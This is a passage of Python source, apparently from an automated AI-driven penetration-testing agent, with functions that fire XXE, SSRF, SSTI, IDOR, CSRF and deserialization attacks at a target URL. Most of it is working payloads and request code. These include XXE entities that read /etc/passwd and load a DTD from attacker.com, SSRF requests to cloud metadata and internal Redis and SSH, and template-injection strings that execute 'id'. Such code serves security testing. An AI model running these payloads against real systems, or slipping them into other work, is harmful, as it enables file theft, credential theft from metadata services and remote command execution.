        "success": False,
        "error": "Exploit not in local database. AI Search required.",
        "cve_id": cve_id,
        "recommendation": "Use search_web tool to find PoC",
    }


# -------------------------
# XXE (XML External Entity)
# -------------------------
async def test_xxe(
    state: "AgentState",
    target_url: str,
    parameter: str = "xml",
) -> dict[str, Any]:
    """Test for XXE (XML External Entity) vulnerability.

    Args:
        state: AgentState instance
        target_url: Target URL accepting XML input
        parameter: XML parameter name

    Returns:
        Dict with test results

    """
    logger.info("Testing XXE on %s", target_url)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    # Precondition check
    can_exploit, reason = check_exploit_preconditions(state, target_url, "xxe")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}

    # XXE Payloads
    xxe_payloads = _get_xxe_payloads()

    results, vulnerable = await _test_xxe_payloads(target_url, xxe_payloads)

    if vulnerable:
        _record_xxe_vulnerability(state, target_url)

    return {
        "type": "XXE",
        "target": target_url,
        "vulnerable": vulnerable,
        "results": results,
    }


def _get_xxe_payloads() -> list[str]:
    """Get XXE test payloads."""
    return [
        # Basic file read
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        # Windows file read
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
        # Parameter entity
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><data>test</data>',
        # CDATA exfiltration
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>',
        # Error-based
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><data>&xxe;</data>',
    ]


async def _test_xxe_payloads(
    target_url: str,
    xxe_payloads: list[str],
) -> tuple[list[dict], bool]:
    """Test all XXE payloads."""
    results = []
    vulnerable = False
    timeout_seconds = 30  # Fixed timeout value

    async with aiohttp.ClientSession() as session:
        for payload in xxe_payloads:
            result = await _test_single_xxe_payload(
                session,
                target_url,
                payload,
                timeout_seconds,
            )
            if result:
                results.append(result)
                if result.get("vulnerable"):
                    vulnerable = True
                    break

    return results, vulnerable


async def _test_single_xxe_payload(
    session: aiohttp.ClientSession,
    target_url: str,
    payload: str,
    timeout_seconds: int,
) -> dict | None:
    """Test a single XXE payload."""
    headers = {"Content-Type": "application/xml"}
    try:
        async with asyncio.timeout(timeout_seconds):
            async with session.post(
                target_url,
                data=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
            ) as resp:
                response_text = await resp.text()
                indicator = _check_xxe_indicators(response_text)

                if indicator:
                    return {
                        "payload": payload[:100] + "...",
                        "indicator": indicator,
                        "vulnerable": True,
                    }
    except TimeoutError:
        logger.debug("XXE test timeout for payload")
    except Exception as e:
        logger.debug("XXE test error: %s", e)
    return None


def _check_xxe_indicators(response_text: str) -> str | None:
    """Check response text for XXE indicators."""
    indicators = [
        INDICATOR_ROOT,
        INDICATOR_DAEMON,
        INDICATOR_EXTENSIONS,
        "for 16-bit app support",
    ]

    for indicator in indicators:
        if indicator in response_text:
            return indicator
    return None


def _record_xxe_vulnerability(state: "AgentState", target_url: str) -> None:
    """Record XXE vulnerability in state."""
    logger.warning("XXE vulnerability found on %s", target_url)
    from core.agent.state import VulnerabilityInfo

    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(
        VulnerabilityInfo(
            vuln_id="XXE",
            service=service,
            port=port,
            severity="high",
            exploitable=True,
        ),
    )


# -------------------------
# SSRF (Server-Side Request Forgery)
# -------------------------
async def test_ssrf(
    state: "AgentState",
    target_url: str,
    parameter: str = "url",
) -> dict[str, Any]:
    """Test for SSRF (Server-Side Request Forgery) vulnerability.

    Args:
        state: AgentState instance
        target_url: Target URL with URL parameter
        parameter: Parameter name accepting URLs

    Returns:
        Dict with test results

    """
    logger.info("Testing SSRF on %s", target_url)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_exploit, reason = check_exploit_preconditions(state, target_url, "ssrf")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}

    # SSRF Payloads
    ssrf_payloads = _get_ssrf_payloads()

    results, vulnerable = await _test_ssrf_payloads(
        target_url,
        parameter,
        ssrf_payloads,
    )

    if vulnerable:
        _record_ssrf_vulnerability(state, target_url)

    return {
        "type": "SSRF",
        "target": target_url,
        "vulnerable": vulnerable,
        "results": results,
    }


def _get_ssrf_payloads() -> list[str]:
    """Get SSRF test payloads."""
    return [
        # Localhost variants
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[:1]/",
        "http://0.0.0.0/",
        "http://127.1/",
        "http://0177.0.0.1/",  # Octal
        "http://2130706433/",  # Decimal
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance",  # Azure
        # Internal services
        "http://localhost:22/",
        "http://localhost:3306/",
        "http://localhost:6379/",
        "http://localhost:27017/",
        # File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        # Gopher
        "gopher://localhost:6379/_INFO",
        # Dict
        "dict://localhost:6379/info",
    ]


async def _test_ssrf_payloads(
    target_url: str,
    parameter: str,
    ssrf_payloads: list[str],
) -> tuple[list[dict], bool]:
    """Test all SSRF payloads."""
    results = []
    vulnerable = False
    timeout_seconds = 30  # Fixed timeout value

    async with aiohttp.ClientSession() as session:
        for payload in ssrf_payloads:
            result = await _test_single_ssrf_payload(
                session,
                target_url,
                parameter,
                payload,
                timeout_seconds,
            )
            if result:
                results.append(result)
                if result.get("vulnerable"):
                    vulnerable = True
                    break

    return results, vulnerable


async def _test_single_ssrf_payload(
    session: aiohttp.ClientSession,
    target_url: str,
    parameter: str,
    payload: str,
    timeout_seconds: int,
) -> dict | None:
    """Test a single SSRF payload."""
    try:
        test_url = f"{target_url}?{parameter}={payload}"

        async with asyncio.timeout(timeout_seconds):
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
                allow_redirects=False,
            ) as resp:
                response_text = await resp.text()
                indicator = _check_ssrf_indicators(response_text)

                if indicator:
                    return {
                        "payload": payload,
                        "indicator": indicator,
                        "vulnerable": True,
                    }
    except TimeoutError:
        logger.debug("SSRF test timeout for payload")
    except Exception as e:
        logger.debug("SSRF test error: %s", e)
    return None


def _check_ssrf_indicators(response_text: str) -> str | None:
    """Check response text for SSRF indicators."""
    indicators = [
        "root:",
        "daemon:",  # /etc/passwd
        _INDICATOR_EXTENSIONS,  # win.ini
        "ami-id",
        "instance-id",  # AWS metadata
        "redis_version",  # Redis
        "SSH-",  # SSH banner
    ]

    response_lower = response_text.lower()
    for indicator in indicators:
        if indicator.lower() in response_lower:
            return indicator
    return None


def _record_ssrf_vulnerability(state: "AgentState", target_url: str) -> None:
    """Record SSRF vulnerability in state."""
    logger.warning("SSRF vulnerability found on %s", target_url)
    from core.agent.state import VulnerabilityInfo

    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(
        VulnerabilityInfo(
            vuln_id="SSRF",
            service=service,
            port=port,
            severity="high",
            exploitable=True,
        ),
    )


# -------------------------
# CSRF (Cross-Site Request Forgery)
# -------------------------

_CSRF_TOKEN_NAMES = (
    "csrf", "_token", "authenticity_token",
    "xsrf", "__requestverificationtoken",
    "antiforgery", "csrfmiddlewaretoken",
)


def _check_forms_for_csrf_tokens(html: str) -> list[dict[str, Any]]:
    """Return findings for POST forms that lack a CSRF token."""
    import re

    findings: list[dict[str, Any]] = []
    forms = re.findall(r"<form[^>]*>.*?</form>", html, re.DOTALL | re.IGNORECASE)
    for i, form in enumerate(forms):
        form_lower = form.lower()
        is_post = (
            "method" not in form_lower
            or 'method="post"' in form_lower
            or "method='post'" in form_lower
        )
        if not is_post:
            continue
        has_token = any(name in form_lower for name in _CSRF_TOKEN_NAMES)
        if not has_token:
            findings.append({
                "type": "missing_csrf_token",
                "detail": f"Form #{i + 1} (POST) has no CSRF token",
                "severity": "high",
            })
    return findings


def _check_cookies_samesite(cookies: Any) -> list[dict[str, Any]]:
    """Return findings for cookies missing the SameSite attribute."""
    findings: list[dict[str, Any]] = []
    for cookie_name, cookie in cookies.items():
        morsel = cookie if hasattr(cookie, "get") else {}
        samesite = morsel.get("samesite", "") if isinstance(morsel, dict) else ""
        if not samesite:
            findings.append({
                "type": "missing_samesite",
                "detail": f"Cookie '{cookie_name}' missing SameSite attribute",
                "severity": "medium",
            })
    return findings


def _check_security_headers(headers: Any) -> list[dict[str, Any]]:
    """Return findings for missing security-related response headers."""
    findings: list[dict[str, Any]] = []
    if "x-frame-options" not in {k.lower() for k in headers}:
        findings.append({
            "type": "missing_x_frame_options",
            "detail": "Missing X-Frame-Options header (clickjacking risk)",
            "severity": "medium",
        })
    return findings


async def test_csrf(
    state: "AgentState",
    target_url: str,
    session: "aiohttp.ClientSession | None" = None,
) -> dict[str, Any]:
    """Test for CSRF (Cross-Site Request Forgery) vulnerability.

    Checks for missing or weak CSRF protections:
    1. Missing anti-CSRF tokens in forms
    2. Missing SameSite cookie attribute
    3. Missing Origin/Referer validation headers

    Returns:
        Dict with findings
    """
    findings: list[dict[str, Any]] = []
    own_session = session is None

    try:
        if own_session:
            session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=15),
            )

        async with session.get(target_url, ssl=False) as resp:
            html = await resp.text()
            findings.extend(_check_forms_for_csrf_tokens(html))
            findings.extend(_check_cookies_samesite(resp.cookies))
            findings.extend(_check_security_headers(resp.headers))

    except Exception as e:
        logger.debug("CSRF test error: %s", e)
        return {"target": target_url, "error": str(e)}
    finally:
        if own_session and session:
            await session.close()

    if findings:
        logger.warning("CSRF weaknesses found on %s: %s findings", target_url, len(findings))
        _record_csrf_vulnerability(state, target_url, findings)

    return {
        "target": target_url,
        "csrf_findings": findings,
        "vulnerable": len(findings) > 0,
        "total_findings": len(findings),
    }


def _record_csrf_vulnerability(
    state: "AgentState",
    target_url: str,
    findings: list[dict[str, Any]],
) -> None:
    """Record CSRF vulnerability in state."""
    from core.agent.state import VulnerabilityInfo

    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    high_count = sum(1 for f in findings if f.get("severity") == "high")
    severity = "high" if high_count > 0 else "medium"
    state.add_vulnerability(
        VulnerabilityInfo(
            vuln_id="CSRF",
            service=service,
            port=port,
            severity=severity,
            exploitable=True,
        ),
    )


# -------------------------
# SSTI (Server-Side Template Injection)
# -------------------------
async def test_ssti(
    state: "AgentState",
    target_url: str,
    parameter: str = "name",
) -> dict[str, Any]:
    """Test for SSTI (Server-Side Template Injection) vulnerability.

    Args:
        state: AgentState instance
        target_url: Target URL
        parameter: Parameter to test

    Returns:
        Dict with test results

    """
    logger.info("Testing SSTI on %s", target_url)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_exploit, reason = check_exploit_preconditions(state, target_url, "ssti")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}

    ssti_payloads = _get_ssti_payloads()
    results, vulnerable, detected_engine = await _test_ssti_payloads(
        target_url,
        parameter,
        ssti_payloads,
    )

    if vulnerable:
        _record_ssti_vulnerability(state, target_url, detected_engine)

    return {
        "type": "SSTI",
        "target": target_url,
        "vulnerable": vulnerable,
        "detected_engine": detected_engine,
        "results": results,
    }


def _get_ssti_payloads() -> list[tuple[str, str]]:
    """Get SSTI test payloads."""
    return [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("${{7*7}}", "49"),
        ("{{config}}", "SECRET_KEY"),
        ("{{''.__class__.__mro__[2].__subclasses__()}}", "__subclasses__"),
        (
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "uid=",
        ),
        ('${"freemarker.template.utility.Execute"?new()("id")}', "uid="),
        (
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
            "uid=",
        ),
        ("{php}echo `id`;{/php}", "uid="),
        ("<%import os%>${os.popen('id').read()}", "uid="),
        (
            "{% set cmd = 'id' %}{% set out = beans['java.lang.Runtime'].getRuntime().exec(cmd).getInputStream() %}{{ out }}",
            "java",
        ),
    ]


async def _test_ssti_payloads(
    target_url: str,
    parameter: str,
    ssti_payloads: list[tuple[str, str]],
) -> tuple[list[dict], bool, str | None]:
    """Test all SSTI payloads."""
    results = []
    vulnerable = False
    detected_engine = None
    timeout_seconds = 30  # Fixed timeout value

    async with aiohttp.ClientSession() as session:
        for payload, expected in ssti_payloads:
            result = await _test_single_ssti_payload(
                session,
                target_url,
                parameter,
                payload,
                expected,
                timeout_seconds,
            )
            if result and result.get("vulnerable"):
                vulnerable = True
                detected_engine = result.get("engine")
                results.append(result)
                break
            if result:
                results.append(result)

    return results, vulnerable, detected_engine


async def _test_single_ssti_payload(
    session: aiohttp.ClientSession,
    target_url: str,
    parameter: str,
    payload: str,
    expected: str,
    timeout_seconds: int,
) -> dict | None:
    """Test a single SSTI payload."""
    try:
        from urllib.parse import quote

        encoded_payload = quote(payload)
        test_url = f"{target_url}?{parameter}={encoded_payload}"

        async with asyncio.timeout(timeout_seconds):
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
            ) as resp:
                response_text = await resp.text()

                if expected in response_text:
                    detected_engine = _detect_template_engine(payload)
                    return {
                        "payload": payload,
                        "expected": expected,
                        "engine": detected_engine,
                        "vulnerable": True,
                    }
    except Exception as e:
        logger.debug("SSTI test error: %s", e)
    return None


def _detect_template_engine(payload: str) -> str:
    """Detect template engine from payload."""
    if "{{" in payload and "config" in payload:
        return "Jinja2"
    if "${" in payload:
        return "Freemarker/Velocity"
    if "{php}" in payload:
        return "Smarty"
    if "<%" in payload:
        return "Mako/ERB"
    return "Unknown"


def _record_ssti_vulnerability(
    state: "AgentState",
    target_url: str,
    detected_engine: str | None,
) -> None:
    """Record SSTI vulnerability in state."""
    logger.warning(
        f"SSTI vulnerability found on {target_url} (Engine: {detected_engine})",
    )
    from core.agent.state import VulnerabilityInfo

    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(
        VulnerabilityInfo(
            vuln_id="SSTI",
            service=service,
            port=port,
            severity="critical",
            exploitable=True,
        ),
    )


# -------------------------
# IDOR (Insecure Direct Object Reference)
# -------------------------
async def test_idor(
    state: "AgentState",
    target_url: str,
    parameter: str = "id",
    known_id: int = 1,
    test_ids: list[int] | None = None,
) -> dict[str, Any]:
    """Test for IDOR (Insecure Direct Object Reference) vulnerability.

    Args:
        state: AgentState instance
        target_url: Target URL with object reference
        parameter: Parameter name containing the ID
        known_id: A known valid ID for baseline
        test_ids: List of IDs to test

    Returns:
        Dict with test results

    """
    logger.info("Testing IDOR on %s", target_url)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_exploit, reason = check_exploit_preconditions(state, target_url, "idor")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}

    if test_ids is None:
        test_ids = [0, 1, 2, known_id - 1, known_id + 1, 100, 1000, 9999]

    async with aiohttp.ClientSession() as session:
        baseline = await _get_idor_baseline(session, target_url, parameter, known_id)
        if not baseline:
            return {"success": False, "error": "Baseline request failed"}

        results, vulnerable, accessible_ids = await _test_idor_ids(
            session,
            target_url,
            parameter,
            test_ids,
            known_id,
            baseline,
        )

        if vulnerable:
            _record_idor_vulnerability(state, target_url)

        return {
            "type": "IDOR",
            "target": target_url,
            "vulnerable": vulnerable,
            "accessible_ids": accessible_ids,
            "results": results,
        }


async def _get_idor_baseline(
    session,
    target_url: str,
    parameter: str,
    known_id: int,
) -> dict | None:
    """Get baseline response for IDOR testing."""
    baseline_url = f"{target_url}?{parameter}={known_id}"
    timeout_seconds = 30  # Fixed timeout value
    try:
        async with asyncio.timeout(timeout_seconds):
            async with session.get(
                baseline_url,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
            ) as resp:
                return {"status": resp.status, "length": len(await resp.text())}
    except Exception as e:
        logger.exception("Baseline request failed: %s", e)
        return None


async def _test_idor_ids(
    session,
    target_url: str,
    parameter: str,
    test_ids: list[int],
    known_id: int,
    baseline: dict,
) -> tuple[list[dict], bool, list[int]]:
    """Test each ID for IDOR vulnerability."""
    results = []
    vulnerable = False
    accessible_ids = []
    timeout_seconds = 30  # Fixed timeout value

    for test_id in test_ids:
        if test_id == known_id:
            continue

        result = await _test_single_idor_id(
            session,
            target_url,
            parameter,
            test_id,
            baseline,
            timeout_seconds,
        )
        if result:
            results.append(result)
            if result.get("vulnerable"):
                vulnerable = True
                accessible_ids.append(test_id)

    return results, vulnerable, accessible_ids


async def _test_single_idor_id(
    session,
    target_url: str,
    parameter: str,
    test_id: int,
    baseline: dict,
    timeout_seconds: int,
) -> dict | None:
    """Test a single ID for IDOR."""
    try:
        test_url = f"{target_url}?{parameter}={test_id}"
        async with asyncio.timeout(timeout_seconds):
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
            ) as resp:
                if resp.status != 200:
                    return None

                response_text = await resp.text()
                response_length = len(response_text)

                if _is_idor_vulnerable(response_length, baseline["length"]):
                    pattern = _find_sensitive_pattern(response_text)
                    return {
                        "id": test_id,
                        "status": resp.status,
                        "length": response_length,
                        "pattern_found": pattern,
                        "vulnerable": True,
                    }
    except Exception as e:
        logger.debug(f"IDOR test error for ID {test_id}: %s", e)
    return None


def _is_idor_vulnerable(response_length: int, baseline_length: int) -> bool:
    """Check if response indicates IDOR vulnerability."""
    length_diff = abs(response_length - baseline_length)
    return length_diff < baseline_length * 0.5 and response_length > 100


def _find_sensitive_pattern(response_text: str) -> str | None:
    """Find sensitive data patterns in response."""
    import re

    patterns = [
        r'"email":\s*"[^"]+@[^"]+"',
        r'"password"',
        r'"ssn"',
        r'"credit_card"',
        r'"phone":\s*"[0-9]+"',
        r'"address"',
        r'"name":\s*"[^"]+"',
    ]
    for pattern in patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return pattern
    return None


def _record_idor_vulnerability(state: "AgentState", target_url: str) -> None:
    """Record IDOR vulnerability in state."""
    logger.warning("IDOR vulnerability found on %s", target_url)
    from core.agent.state import VulnerabilityInfo

    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(
        VulnerabilityInfo(
            vuln_id="IDOR",
            service=service,
            port=port,
            severity="high",
            exploitable=True,
        ),
    )


# -------------------------
# Deserialization
# -------------------------
async def test_deserialization(
    state: "AgentState",
    target_url: str,
    parameter: str = "data",
    framework: str = "auto",
) -> dict[str, Any]:
    """Test for insecure deserialization vulnerability.

    Args:
        state: AgentState instance
        target_url: Target URL
        parameter: Parameter accepting serialized data
        framework: Target framework (java, php, python, auto)

    Returns:
        Dict with test results

    """
    logger.info("Testing deserialization on %s", target_url)

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_exploit, reason = check_exploit_preconditions(
        state,
        target_url,
        "deserialization",
    )
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}

    payloads = _get_deserialization_payloads()
    frameworks_to_test = [framework] if framework != "auto" else list(payloads.keys())

    results, vulnerable, detected_framework = await _test_deserialization_payloads(
        target_url,
        parameter,
        payloads,
        frameworks_to_test,
    )

    if vulnerable:
        _record_deserialization_vulnerability(state, target_url, detected_framework)

    return {
        "type": "DESERIALIZATION",
        "target": target_url,
        "vulnerable": vulnerable,
        "detected_framework": detected_framework,
        "results": results,
    }


def _get_deserialization_payloads() -> dict[str, list[str]]:
    """Get deserialization payloads by framework."""
    return {
        "java": [
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAACdAABYXQAAWJ4",
        ],
        "php": [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;O:8:"stdClass":0:{}}',
        ],
        "python": [
            "gASVCAAAAAAAAACMBHRlc3SULg==",
        ],
        ".net": [
            "/wEPDwUKLTEwNDU5ODU1OQ9kFgICAw9kFgICAQ8PFgIeBFRleHQFDUhlbGxvLCBXb3JsZCFkZGQ=",
        ],
    }


async def _test_deserialization_payloads(
    target_url: str,
    parameter: str,
    payloads: dict[str, list[str]],
    frameworks_to_test: list[str],
) -> tuple[list[dict], bool, str | None]:
    """Test deserialization payloads for all frameworks."""
    results = []
    vulnerable = False
    detected_framework = None
    indicators = _get_deserialization_indicators()
    timeout_seconds = 30  # Fixed timeout value

    async with aiohttp.ClientSession() as session:
        for fw in frameworks_to_test:
            if fw not in payloads:
                continue

            for payload in payloads[fw]:
                result = await _test_single_deserialization_payload(
                    session,
                    target_url,
                    parameter,
                    payload,
                    fw,
                    indicators,
                    timeout_seconds,
                )
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        vulnerable = True
                        detected_framework = fw
                        break
            if vulnerable:
                break

    return results, vulnerable, detected_framework


def _get_deserialization_indicators() -> list[str]:
    """Get deserialization error indicators."""
    return [
        "java.io.ObjectInputStream",
        "unserialize()",
        "pickle",
        "ClassNotFoundException",
        "InvalidClassException",
        "__wakeup",
        "__destruct",
    ]


async def _test_single_deserialization_payload(
    session: aiohttp.ClientSession,
    target_url: str,
    parameter: str,
    payload: str,
    framework: str,
    indicators: list[str],
    timeout_seconds: int,
) -> dict | None:
    """Test a single deserialization payload."""
    try:
        async with asyncio.timeout(timeout_seconds):
            async with session.post(
                target_url,
                data={parameter: payload},
                timeout=aiohttp.ClientTimeout(total=timeout_seconds),
            ) as resp:
                response_text = await resp.text()

                for indicator in indicators:
                    if indicator.lower() in response_text.lower():
                        return {
                            "framework": framework,
                            "payload": payload[:50] + "...",
                            "indicator": indicator,
                            "vulnerable": True,
                        }
    except Exception as e:
        logger.debug("Deserialization test error: %s", e)
    return None


def _record_deserialization_vulnerability(
    state: "AgentState",
    target_url: str,
    detected_framework: str | None,
) -> None:
    """Record deserialization vulnerability in state."""
    logger.warning(
        f"Deserialization vulnerability found on {target_url} ({detected_framework})",
    )
    from core.agent.state import VulnerabilityInfo

    parsed_url = urlparse(target_url)
    port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
    service = parsed_url.scheme or "http"
    state.add_vulnerability(
        VulnerabilityInfo(
            vuln_id="DESERIALIZATION",
            service=service,
            port=port,
            severity="critical",
            exploitable=True,
        ),
    )
